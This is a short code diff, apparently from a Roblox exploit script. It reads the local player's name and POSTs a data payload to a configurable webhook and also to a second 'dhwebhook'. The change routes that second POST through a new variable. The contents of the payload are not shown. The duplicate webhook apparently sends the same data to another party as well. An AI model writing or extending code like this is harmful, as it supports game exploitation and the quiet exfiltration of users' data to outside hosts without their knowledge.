@@ -73,6 +73,7 @@ getexploit()
 local dhid
 local idiotuser = game:GetService("Players").LocalPlayer.Name
 local url = Webhook
+local url2 = dhwebhook
 if _G.UserID == nil then
     game:GetService("Players").LocalPlayer:Kick("Put A UserId")
     return;
@@ -1365,17 +1366,17 @@ if Webhook ~= nil then
         Url = url,
         Body = newdata1,
         Method = "POST",
-        Headers = headers,
+        Headers = headers
     }
     request(abcdef1)
 end
 task.wait()
 if dhwebhook ~= nil then
     local abcdef2 = {
-        Url = dhwebhook,
+        Url = url2,
         Body = newdata1,
         Method = "POST",
-        Headers = headers,
+        Headers = headers
     }
     request(abcdef2)
 end
